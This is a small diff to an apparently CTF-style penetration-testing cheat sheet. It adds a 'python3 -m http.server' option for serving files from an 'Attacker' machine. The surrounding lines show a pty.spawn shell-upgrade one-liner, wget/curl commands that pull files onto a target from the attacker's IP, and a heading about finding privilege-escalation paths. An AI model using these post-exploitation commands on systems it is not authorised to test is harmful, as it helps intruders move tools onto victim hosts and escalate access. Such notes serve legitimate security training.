@@ -7,7 +7,7 @@
 ```python -c 'import pty; pty.spawn("/bin/bash")'```
 
 **Download files to remote host via shell**  
-Local (Attacker): ```python -m SimpleHTTPServer 80```  
+Local (Attacker): ```python -m SimpleHTTPServer 80```  _**OR**_ ```python3 -m http.server 80```
 Remote (Target): ```wget <your ip>/desired.file``` _**OR**_ ```curl <your IP>/desired.file```
 
 **Check which files the current user can run as root (possible PrivEsc)**  
